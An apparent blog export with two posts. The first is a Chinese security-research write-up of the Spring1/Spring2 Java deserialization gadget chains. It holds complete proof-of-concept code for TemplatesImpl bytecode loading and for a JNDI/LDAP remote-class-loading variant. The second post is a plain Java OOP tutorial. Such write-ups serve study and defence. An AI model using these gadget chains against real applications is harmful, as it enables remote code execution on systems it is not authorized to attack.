&quot;own&quot; the target,			// in case it comes from a pool.			target = targetSource.getTarget();			if (target != null) &#123;				targetClass = target.getClass();			&#125;			// Get the interception chain for this method.			List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);			// Check whether we have any advice. If we don&#x27;t, we can fallback on direct			// reflective invocation of the target, and avoid creating a MethodInvocation.			if (chain.isEmpty()) &#123;				// We can skip creating a MethodInvocation: just invoke the target directly				// Note that the final invoker must be an InvokerInterceptor so we know it does				// nothing but a reflective operation on the target, and no hot swapping or fancy proxying.				retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);			&#125;			.			.			.			.			.			return retVal;		&#125;		finally &#123;			if (target != null &amp;&amp; !targetSource.isStatic()) &#123;				// Must have come from TargetSource.				targetSource.releaseTarget(target);			&#125;			if (setProxyContext) &#123;				// Restore old proxy.				AopContext.setCurrentProxy(oldProxy);			&#125;		&#125;	&#125;

从提供的链子可知首先我们要关注的是retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args);
跟进invokeJoinpointUsingReflection方法

里面就是简简单单对方法进行了反射调用
所以重点看参数target：target = targetSource.getTarget();
再看targetSource：TargetSource targetSource = this.advised.targetSource;
再跟进targetSource我们可以发现是在AdvisedSupport类里面调用了setTarget方法来进行赋值的

因此我们只需要在调用setTarget的时候将其参数target设为我们的TemplatesImpl对象就可以了，那么最后在invokeJoinpointUsingReflection方法里反射调用的就是我们的TemplatesImpl对象的newTransformer方法了
调试综上所述，我们的poc如下：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.springframework.aop.framework.AdvisedSupport;import org.springframework.aop.target.SingletonTargetSource;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Poc &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        setField(templates, &quot;_name&quot;, &quot;aaa&quot;);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        setField(templates,&quot;_bytecodes&quot;, codes);        setField(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());        // 将 AdvisedSupport 的 target 属性值设置为 templates        // AdvisedSupport 是 Spring AOP 的代理配置 managaer        AdvisedSupport as = new AdvisedSupport();        as.setTargetSource(new SingletonTargetSource(templates));        // 使用 JdkDynamicAopProxy(实现了InvocationHandler接口) 来创建 Type 和 Templates 接口的动态代理        // JdkDynamicAopProxy 的 advised 属性值为 as        Class&lt;?&gt; c =Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];        constructor.setAccessible(true);        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(as);        Type typeTemplatesProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Type.class, Templates.class&#125;, invocationHandler);        Map&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;getType&quot;, typeTemplatesProxy);        Class&lt;?&gt; class2 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; constructor2 = class2.getDeclaredConstructor(Class.class, Map.class);        constructor2.setAccessible(true);        InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(Target.class, hashMap);        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;typeProviderClass&#125;, invocationHandler2);        Class&lt;?&gt; class3 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);        Constructor&lt;?&gt; constructor3 = class3.getDeclaredConstructors()[0];        constructor3.setAccessible(true);        Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);        setField(object, &quot;methodName&quot;, &quot;newTransformer&quot;);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(object);        byte[] serializedBytes = byteArrayOutputStream.toByteArray();        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);        System.out.println(base64Encoded);        byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded);        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes));        objectInputStream.readObject();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception &#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object, value);    &#125;&#125;

前面的调试都是一样的，这边直接省略，直接跳到调用invokeMethod方法，跟进去

我们便来到了JdkDynamicAopProxy类的invoke方法里

继续往下走

target获取到了我们的TemplatesImpl对象
继续往下走

跟进

方法反射调用，成功弹出计算器
攻击面拓展学习完这两条链子之后我就思考着要是TemplatesImpl类被禁掉了要怎么办，在网上搜寻了一番后发现没有现成的文章来讲述相关的解决办法，所以打算自己尝试一手
我想的是将该链子与jndi注入联系起来，从而实现远程类加载
思路有了那么接下来就是要找到合适的实现类了，最开始我想到的是JDBcRowSetImpl类，利用它的getDatabaseMetaData()方法

但是嘞由于我们链子前面都是用到了代理，所以也就说明我们所找的这个方法必须是位于接口中的，很遗憾该方法就只位于JDBcRowSetImpl类里面，所以用不了
接下来又到处找实现类，全局搜索lookup方法等等，都没有找到我所需要的
直到突然之间想起了之前看过的一篇文章：http://blog.potatowo.top/2025/03/23/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E8%B5%9B2025%E5%8D%8E%E4%B8%9C%E8%B5%9B%E5%8C%BA%E5%8D%8A%E5%86%B3%E8%B5%9Bwp-web/
在这篇文章里面提到了一个类com.sun.jndi.ldap.LdapAttribute，其有个getAttributeDefinition()方法，其中调用了lookup()

该类继承了BasicAttribute类，跟过去
BasicAttribute类实现了Attribute接口，在这个接口中定义了getAttributeDefinition()方法

很好，一切都对上了，这就是我找了许久的类
重新改一下我们的poc，如下
package org.example;import org.springframework.beans.factory.ObjectFactory;import sun.reflect.ReflectionFactory;import javax.naming.CompositeName;import javax.naming.directory.Attribute;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Base64;import java.util.HashMap;import java.util.Map;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        Class c1 = Class.forName(&quot;com.sun.jndi.ldap.LdapAttribute&quot;);        Class c2 = Class.forName(&quot;javax.naming.directory.BasicAttribute&quot;);        Object ldap = createObjWithConstructor(c1,c2,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;6924bf&quot;&#125;);        setField(ldap,&quot;rdn&quot;,new CompositeName(&quot;a//b&quot;));        setField(ldap,&quot;baseCtxURL&quot;,&quot;ldap://127.0.0.1:50389/&quot;);        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;getObject&quot;, ldap);        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, hashMap);        ObjectFactory&lt;?&gt; objectFactory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;ObjectFactory.class&#125;, invocationHandler);        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;);        Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructors()[0];        constructor2.setAccessible(true);        InvocationHandler invocationHandler2 = (InvocationHandler) constructor2.newInstance(objectFactory);        Type type = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Type.class, Attribute.class&#125;, invocationHandler2);        HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();        hashMap2.put(&quot;getType&quot;, type);        InvocationHandler invocationHandler3 = (InvocationHandler) constructor.newInstance(Target.class, hashMap2);        Class&lt;?&gt; typeProviderClass = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;);        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;typeProviderClass&#125;, invocationHandler3);        Class&lt;?&gt; class2 = Class.forName(&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;);        Constructor&lt;?&gt; constructor3 = class2.getDeclaredConstructors()[0];        constructor3.setAccessible(true);        Object object = constructor3.newInstance(typeProviderProxy, Object.class.getMethod(&quot;toString&quot;), 0);        setField(object, &quot;methodName&quot;, &quot;getAttributeDefinition&quot;);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(object);        byte[] serializedBytes = byteArrayOutputStream.toByteArray();        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);        System.out.println(base64Encoded);        byte[] decodedBytes = Base64.getDecoder().decode(base64Encoded);        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(decodedBytes));        objectInputStream.readObject();    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static &lt;T&gt; T createObjWithConstructor (Class&lt;T&gt; clazz,Class&lt;? super T&gt; superClazz,Class&lt;?&gt;[] argsTypes,Object[] argsValues) throws Exception&#123;        Constructor&lt;?super T&gt; constructor = superClazz.getDeclaredConstructor(argsTypes);        constructor.setAccessible(true);        Constructor&lt;?&gt; constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance(argsValues);    &#125;&#125;

进行测试，成功弹出计算器

然后后面进行一个调试，发现其实进行了一个远程类加载的相关代码并不是getAttributeDefinition()方法中最明显的lookup函数
这边笔者就不进行调试了，想调试的可以自己去试试，调用栈如下：
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)c_resolveIntermediate_nns:168, ComponentContext (com.sun.jndi.toolkit.ctx)c_resolveIntermediate_nns:359, AtomicContext (com.sun.jndi.toolkit.ctx)p_resolveIntermediate:439, ComponentContext (com.sun.jndi.toolkit.ctx)p_getSchema:432, ComponentDirContext (com.sun.jndi.toolkit.ctx)getSchema:422, PartialCompositeDirContext (com.sun.jndi.toolkit.ctx)getSchema:210, InitialDirContext (javax.naming.directory)getAttributeDefinition:207, LdapAttribute (com.sun.jndi.ldap)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invoke:307, AutowireUtils$ObjectFactoryDelegatingInvocationHandler (org.springframework.beans.factory.support)getAttributeDefinition:-1, $Proxy1 (com.sun.proxy)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeMethod:202, ReflectionUtils (org.springframework.util)invokeMethod:187, ReflectionUtils (org.springframework.util)readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)invokeReadObject:1058, ObjectStreamClass (java.io)readSerialData:1900, ObjectInputStream (java.io)readOrdinaryObject:1801, ObjectInputStream (java.io)readObject0:1351, ObjectInputStream (java.io)readObject:371, ObjectInputStream (java.io)main:66, Main (org.example)

总结spring1和spring2的链子都与动态代理密切相关，建议是先熟练掌握了动态代理之后再来学习这两条链子会比较轻松
对于这两条链的利用肯定不止笔者这里提到的这些，大家有兴趣的也可以自己去找找看
]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java学习</title>
    <url>/2024/07/27/java%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[面向对象-基础类和对象的内存分配机制Java 内存的结构分析 

栈： 一般存放基本数据类型(局部变量) 
堆： 存放对象(Cat cat , 数组等) 
方法区：常量池(常量，比如字符串)， 类加载信息

举一个创建对象的流程分析例子
Person p = new Person();p.name = “jack”;p.age = 10


先加载 Person 类信息(属性和方法信息, 只会加载一次）
在堆中分配空间, 进行默认初始化(看规则)
把地址赋给 p , p 就指向对象
进行指定初始化， 比如 p.name &#x3D;”jack” p.age &#x3D; 10

成员方法调用机制示意图
递归例题一
下面为该题代码
public class Test &#123;    public static void main(String[] args) &#123;        T t1 = new T();        int n = 7;        int res = t1.fibonacci(n);        if(res != -1) &#123;            System.out.println(&quot;当 n=&quot;+ n +&quot; 对应的斐波那契数=&quot; + res);        &#125;        int day = 1;        int peachNum = t1.peach(day);        if(peachNum != -1) &#123;            System.out.println(&quot;第 &quot; + day + &quot;天有&quot; + peachNum + &quot;个桃子&quot;);        &#125;    &#125;&#125;class T &#123;    public int fibonacci(int n) &#123;        if(n == 1 || n == 2) &#123;            return 1;        &#125;else&#123;            return fibonacci(n-1) + fibonacci(n-2);        &#125;    &#125;    public int peach(int day)&#123;        if(day == 10) &#123;//第 10 天，只有 1 个桃            return 1;        &#125; else if ( day &gt;= 1 &amp;&amp; day &lt;=9 ) &#123;            return (peach(day + 1) + 1) * 2;//规则，自己要想        &#125; else &#123;            System.out.println(&quot;day 在 1-10&quot;);            return -1;        &#125;    &#125;&#125;

汉诺塔public class StringToBasicDetail &#123;    public static void main(String[] args) &#123;        Tower tower = new Tower();        tower.move(5, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;);    &#125;&#125;class Tower&#123;    public void move(int num, char a, char b, char c)&#123;        //如果只有一个盘 num = 1        if(num == 1) &#123;            System.out.println(a + &quot;-&gt;&quot; + c);        &#125; else &#123;        //如果有多个盘，可以看成两个 , 最下面的和上面的所有盘(num-1)        //(1)先移动上面所有的盘到 b, 借助 c            move(num - 1 , a, c, b);        //(2)把最下面的这个盘，移动到 c            System.out.println(a + &quot;-&gt;&quot; + c);        //(3)再把 b 塔的所有盘，移动到 c ,借助 a            move(num - 1, b, a, c);        &#125;    &#125;&#125;

可变参数java 允许将同一个类中多个同名同功能但参数个数不同的方法，封装成一个方法
基本语法如下所示：
访问修饰符 返回类型 方法名(数据类型... 形参名) &#123;&#125;

举个例子：
public class StringToBasicDetail &#123;    public static void main(String[] args) &#123;        HspMethod m = new HspMethod();        System.out.println(m.sum(1, 5, 100));        System.out.println(m.sum(1,19));    &#125;&#125;class HspMethod&#123;    public int sum(int... nums)&#123;        //1. int... 表示接受的是可变参数，类型是 int ,即可以接收多个 int(0-多)        //2. 使用可变参数时，可以当做数组来使用 即 nums 可以当做数组        //3. 遍历 nums 求和即可        int res = 0;        for(int i = 0; i&lt;nums.length; i++)&#123;            res += nums[i];        &#125;        return res;    &#125;&#125;


可变参数与普通参数一起的例子如下：
public class StringToBasicDetail &#123;    public static void main(String[] args) &#123;        HspMethod m = new HspMethod();        System.out.println(m.showScore(&quot;Sherlock&quot;,90.1,80,87.8 ));    &#125;&#125;class HspMethod&#123;    public String showScore(String name, double... scores)&#123;        double total = 0;        for(int i = 0; i&lt;scores.length; i++)&#123;            total += scores[i];        &#125;        return name + &quot;：&quot; + total;    &#125;&#125;

构造器基础构造方法又叫构造器(constructor)，是类的一种特殊的方法，它的主要作用是完成对新对象的初始化。
它有几个特点： 

方法名和类名相同
没有返回值
在创建对象时，系统会自动的调用该类的构造器完成对象的初始化

class Person &#123;String name;int age;//1. 构造器没有返回值, 也不能写 void//2. 构造器的名称和类 Person 一样//3. (String pName, int pAge) 是构造器形参列表，规则和成员方法一样public Person(String pName, int pAge) &#123;System.out.println(&quot;构造器被调用~~ 完成对象的属性初始化&quot;);name = pName;age = pAge;&#125;&#125;

一个类也可以有多个构造器，即构造器重载
创建对象的时候，会自动调用该类的构造方法
this关键字this表示的就是当前对象
public class StringToBasicDetail &#123;    public static void main(String[] args) &#123;        Dog dog1 = new Dog(&quot;小黑&quot;,3);        dog1.info();    &#125;&#125;class Dog&#123;    String name;    int age;    Dog(String name,int age)&#123;        this.name = name;        this.age = age;    &#125;    void info()&#123;        System.out.println(&quot;this.hashCode=&quot; + this.hashCode());        System.out.println(name + &quot;\t&quot; + age + &quot;\t&quot;);    &#125;&#125;

面向对象-中级包（package）包（package）是用于组织类和接口的命名空间。包提供了一种将相关的类和接口进行分组的机制，方便代码的管理和维护。通过使用包，可以避免类名冲突，增强代码的可读性和可维护性
包的本质实际上就是创造出不同的文件夹来保存类文件
包的声明用package关键字，引入用import关键字，如下：
我们需要使用到哪个类，就导入哪个类即可，不建议使用 *导入 
import java.util.Scanner; //表示只会引入 java.util 包下的 Scannerimport java.util.*;//表示将 java.util 包下的所有类都引入(导入)

访问修饰符java 提供四种访问控制修饰符号，用于控制方法和属性(成员变量)的访问权限（范围）: 

公开级别:用 public 修饰,对外公开
受保护级别:用 protected 修饰,对子类和同一个包中的类公开
默认级别:没有修饰符号,向同一个包的类公开
私有级别:用 private 修饰,只有类本身可以访问,不对外公开


继承
子类继承了所有的属性和方法，非私有的属性和方法可以在子类直接访问, 但是私有属性和方法不能在子类直接访 问，要通过父类提供公共的方法去访问
子类必须调用父类的构造器， 完成父类的初始化
当创建子类对象时，不管使用子类的哪个构造器，默认情况下总会去调用父类的无参构造器，如果父类没有提供无参构造器，则必须在子类的构造器中用 super 去指定使用父类的哪个构造器完成对父类的初始化工作，否则，编译不会通过
如果希望指定去调用父类的某个构造器，则显式的调用一下 : super(参数列表) 
super 在使用时，必须放在构造器第一行(super只能在构造器中使用)
super() 和 this() 都只能放在构造器第一行，因此这两个方法不能共存在一个构造器
java 所有类都是 Object 类的子类, Object 是所有类的基类.
父类构造器的调用不限于直接父类！将一直往上追溯直到 Object 类(顶级父类)
子类最多只能继承一个父类(指直接继承)，即 java 中是单继承机制
不能滥用继承，子类和父类之间必须满足 is-a 的逻辑关系

这里来解释一下super()和this()之间的区别所在
super()

调用父类构造方法：super()用于在子类的构造方法中调用父类的构造方法。这样做是为了确保父类的构造方法在子类的构造方法之前执行。
必须是构造方法的第一行：super()调用必须是子类构造方法中的第一条语句。如果没有显式地调用super()，编译器会在没有参数的情况下隐式地调用父类的无参构造方法。
参数传递：可以使用参数将值传递给父类的构造方法，例如super(param1, param2)。

来个例子如下：
class Parent &#123;    Parent() &#123;        System.out.println(&quot;Parent Constructor&quot;);    &#125;&#125;class Child extends Parent &#123;    Child() &#123;        super();        System.out.println(&quot;Child Constructor&quot;);    &#125;&#125;public class Test &#123;    public static void main(String[] args) &#123;        Child child = new Child();    &#125;&#125;

this()

调用当前类的构造方法：this()用于调用当前类的另一个构造方法。这通常用于构造方法之间的重用代码。
必须是构造方法的第一行：与super()类似，this()调用也必须是构造方法中的第一条语句。
参数传递：可以使用参数将值传递给当前类的另一个构造方法，例如this(param1, param2)。

class Example &#123;    Example() &#123;        this(&quot;Hello&quot;);        System.out.println(&quot;Default Constructor&quot;);    &#125;    Example(String msg) &#123;        System.out.println(&quot;Parameterized Constructor: &quot; + msg);    &#125;&#125;public class Test &#123;    public static void main(String[] args) &#123;        Example example = new Example();    &#125;&#125;

super关键字super 代表父类的引用，用于访问父类的属性、方法、构造器


super关键字不会访问当前类（本类）的成员和方法
访问父类的成员变量
class Parent &#123;    int x = 10;&#125;class Child extends Parent &#123;    int x = 20;        void display() &#123;        System.out.println(&quot;Child x: &quot; + x);        System.out.println(&quot;Parent x: &quot; + super.x); // 访问父类的成员变量    &#125;&#125;public class Main &#123;    public static void main(String[] args) &#123;        Child child = new Child();        child.display();    &#125;&#125;

访问父类的方法
class Parent &#123;    void display() &#123;        System.out.println(&quot;Display from Parent&quot;);    &#125;&#125;class Child extends Parent &#123;    void display() &#123;        System.out.println(&quot;Display from Child&quot;);        super.display(); // 调用父类的方法    &#125;&#125;public class Main &#123;    public static void main(String[] args) &#123;        Child child = new Child();        child.display();    &#125;&#125;

super关键字所带来的便利

方法覆写方法覆写就是子类中有一个方法，和父类的某个方法的名称、返回类型、参数一样，那么我们就说子类的这个方法覆盖了父类的方法
以下是几个需要注意的点：
方法签名：

覆写的方法必须具有与父类方法相同的方法签名，包括方法名和参数列表。

访问修饰符：

子类方法的访问修饰符不能比父类方法的更严格。例如，如果父类方法是public，子类方法也必须是public。

返回类型：

覆写方法的返回类型可以是父类方法返回类型的子类型（协变返回类型），但不能是其他不相关的类型。（父类 返回类型是 Object ,子类方法返回类型是 String）

异常处理：

子类方法抛出的异常不能比父类方法抛出的异常更广泛。例如，如果父类方法抛出一个IOException，子类方法只能抛出IOException或其子类的异常，不能抛出Exception或其他更泛的异常。

使用@Override注解：

在覆写的方法上加上@Override注解有助于编译器检查是否正确地覆写了父类的方法。如果没有正确覆写，编译器会报错。

调用父类方法：

在子类方法中，可以使用super关键字调用父类的方法。例如：super.methodName()。

静态方法不能覆写：

静态方法不能被覆写（Override），而是被隐藏（Hide）。如果子类定义了一个与父类静态方法相同的方法，这只是隐藏了父类的方法，并不是覆写。

final方法不能覆写：

如果父类的方法被声明为final，那么子类不能覆写这个方法。

构造方法不能覆写：

构造方法不能被继承或覆写。

class Animal &#123;    public void makeSound() &#123;        System.out.println(&quot;Animal makes a sound&quot;);    &#125;    public void eat() throws IOException &#123;        System.out.println(&quot;Animal eats&quot;);    &#125;&#125;class Dog extends Animal &#123;    @Override    public void makeSound() &#123;        System.out.println(&quot;Dog barks&quot;);    &#125;    @Override    public void eat() throws IOException &#123;        System.out.println(&quot;Dog eats&quot;);    &#125;&#125;public class Main &#123;    public static void main(String[] args) throws IOException &#123;        Animal myDog = new Dog();        myDog.makeSound(); // 输出：Dog barks        myDog.eat();       // 输出：Dog eats    &#125;&#125;

重写与覆写之间的区别

下面来一个实例：

编写一个 Person 类，包括属性&#x2F;private（name、age），构造器、方法 say(返回自我介绍的字符串）
编写一个 Student 类，继承 Person 类，增加 id、score 属性&#x2F;private，以及构造器，定义 say 方法(返回自我介绍的信息)
在 main 中,分别创建 Person 和 Student 对象，调用 say 方法输出自我介绍

Person.java
package show;public class Person &#123;    private String name;    private int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public  String say()&#123;        return &quot;name=&quot; + name + &quot; age=&quot; + age;    &#125;&#125;

Student.java
package show;public class Student extends Person &#123;    private int id;    private  double score;    public Student(String name, int age, int id, double score) &#123;        super(name, age);        this.id = id;        this.score = score;    &#125;    public String say()&#123;        return super.say() + &quot; id=&quot; + id + &quot; score=&quot; + score;//super()方法，代码复用    &#125;&#125;

Test.java
import show.*;public class Test &#123;    public static void main(String[] args) &#123;//在 main 中,分别创建 Person 和 Student 对象，调用 say 方法输出自我介绍        Person jack = new Person(&quot;jack&quot;, 10);        System.out.println(jack.say());        Student smith = new Student(&quot;smith&quot;, 20, 123456, 99.8);        System.out.println(smith.say());    &#125;&#125;

多态方法的多态方法的重写和重载就体现了多态
对象的多态
类Dog,Cat都是类Animal的子类，已经定义过了
public class PolyObject &#123;	public static void main(String[] args) &#123;	//体验对象多态特点	//animal 编译类型就是 Animal , 运行类型 Dog	Animal animal = new Dog();	//因为运行时 , 执行到改行时，animal 运行类型是 Dog,所以 cry 就是 Dog 的 cry	animal.cry(); //小狗汪汪叫	//animal 编译类型 Animal,运行类型就是 Cat	animal = new Cat();	animal.cry(); //小猫喵喵叫	&#125;&#125;

因此，利用多态我们就可以完成下面这道编程题目

对于这道题，当我们写完各种的子类之后，在上面类Master中的方法就只要写下面这个

多态的注意事项和细节多态的前提是：两个对象(类)存在继承关系

举个例子，如下所示：
public class PolyDetail &#123;	public static void main(String[] args) &#123;	//向上转型: 父类的引用指向了子类的对象	//语法：父类类型引用名 = new 子类类型();	Animal animal = new Cat();	Object obj = new Cat();//可以吗? 可以 Object 也是 Cat 的父类	//向上转型调用方法的规则如下:	//(1)可以调用父类中的所有成员(需遵守访问权限)	//(2)但是不能调用子类的特有的成员	//(#)因为在编译阶段，能调用哪些成员,是由编译类型来决定的	//animal.catchMouse();错误	//(4)最终运行效果看子类(运行类型)的具体实现, 即调用方法时，按照从子类(运行类型)开始查找方法	//，然后调用，规则我前面我们讲的方法调用规则一致。	animal.eat();//猫吃鱼.. animal.run();//跑	animal.show();//hello,你好	animal.sleep();//睡	//希望可以调用 Cat 的 catchMouse 方法	//多态的向下转型	//(1)语法：子类类型 引用名 =（子类类型）父类引用;	//问一个问题? cat 的编译类型 Cat,运行类型是 Cat	Cat cat = (Cat) animal;	cat.catchMouse();//猫抓老鼠	//(2)要求父类的引用必须指向的是当前目标类型的对象	Dog dog = (Dog) animal; //可以吗？	System.out.println(&quot;ok~~&quot;);	&#125;&#125;

属性没有重写一说，属性的值要看编译类型
public class PolyDetail02 &#123;public static void main(String[] args) &#123;//属性没有重写之说！属性的值看编译类型Base base = new Sub();//向上转型System.out.println(base.count);// ？ 看编译类型 10Sub sub = new Sub();System.out.println(sub.count);//? 20&#125;&#125;class Base &#123; //父类int count = 10;//属性&#125;class Sub extends Base &#123;//子类int count = 20;//属性&#125;

instanceOf 比较操作符，用于判断对象的运行类型是否为 XX 类型或 XX 类型的子类型
System.out.println(bb instanceof BB);

多态的应用（1）多态数组：数组的定义类型为父类类型，里面保存的实际元素类型为子类类型
应用实例:现有一个继承结构如下：要求创建 1 个 Person 对象、2 个 Student 对象和 2 个 Teacher 对象, 统一放在数组 中，并调用每个对象 say 方法. 应用实例升级：如何调用子类特有的方法，比如 Teacher 有一个 teach , Student 有一个 study 怎么调用？
在已经写完Person,Student,Teacher类后的测试代码如下：
import show.*;public class Test &#123;    public static void main(String[] args) &#123;        //应用实例:现有一个继承结构如下：要求创建 1 个 Person 对象、		// 2 个 Student 对象和 2 个 Teacher 对象, 统一放在数组中，并调用每个对象 say 方法        Person[] persons = new Person[5];        persons[0] = new Person(&quot;jack&quot;, 20);        persons[1] = new Student(&quot;mary&quot;, 18, 100);        persons[2] = new Student(&quot;smith&quot;, 19, 30.1);        persons[3] = new Teacher(&quot;scott&quot;, 30, 20000);        persons[4] = new Teacher(&quot;king&quot;, 50, 25000);		//循环遍历多态数组，调用 say        for (int i = 0; i &lt; persons.length; i++) &#123;		//person[i] 编译类型是 Person ,运行类型是是根据实际情况有 JVM 来判断            System.out.println(persons[i].say());//动态绑定机制		//这里使用 类型判断 + 向下转型.         if(persons[i] instanceof Student) &#123;//判断 person[i] 的运行类型是不是Student            Student student = (Student)persons[i];//向下转型            student.study();		//也可以使用一句话 ((Student)persons[i]).study();        &#125; else if(persons[i] instanceof Teacher) &#123;            Teacher teacher = (Teacher) persons[i];            teacher.teach();        &#125;        &#125;&#125;

（2）多态参数
方法定义的形参类型为父类类型，实参类型可以为子类类型
实例就比如前面的主人喂食动物
面向对象-高级类变量和类方法类变量在 Java 中，类变量（也称为静态变量，static variable）是属于整个类而不是某个特定对象的变量。类变量在类加载时初始化，并且在类的所有实例之间共享。它们使用关键字 static 来声明
定义类变量：访问修饰符 static 数据类型 变量名;
访问类变量：类名/对象名.类变量名;
来个例子简单了解一下
public class New &#123;    public static void main(String[] args) &#123;//定义一个变量 count, 统计有多少小孩加入了游戏        int count = 0;        Child child1 = new Child(&quot;白骨精&quot;);        child1.join();//count++;        child1.count++;        Child child2 = new Child(&quot;狐狸精&quot;);        child2.join();//count++;        child2.count++;        Child child3 = new Child(&quot;老鼠精&quot;);        child3.join();//count++;        child3.count++;//===========//类变量，可以通过类名来访问        System.out.println(&quot;共有&quot; + Child.count + &quot; 小孩加入了游戏...&quot;);        System.out.println(&quot;child1.count=&quot; + child1.count);//3        System.out.println(&quot;child2.count=&quot; + child2.count);//3        System.out.println(&quot;child3.count=&quot; + child3.count);//3    &#125;&#125;class Child &#123; //类    private String name;    //定义一个变量 count ,是一个类变量(静态变量) static 静态//该变量最大的特点就是会被 Child 类的所有的对象实例共享    public static int count = 0;    public Child(String name) &#123;        this.name = name;    &#125;    public void join() &#123;        System.out.println(name + &quot; 加入了游戏..&quot;);    &#125;&#125;

注意

类变量在类加载的时候就初始化了，也就是说即使你没有创建对象，只要类加载了，就可以使用类变量了
当一个类的所有对象都共享一个变量的时候，考虑使用类变量：比如定义学生类，统计所有学生一共交了多少钱 Student(name,static fee)

类方法类方法就是静态方法，形式为：访问修饰符 static 数据返回类型 方法名()&#123;&#125;
使用：类名/对象名.类方法名
来个例子理解一下
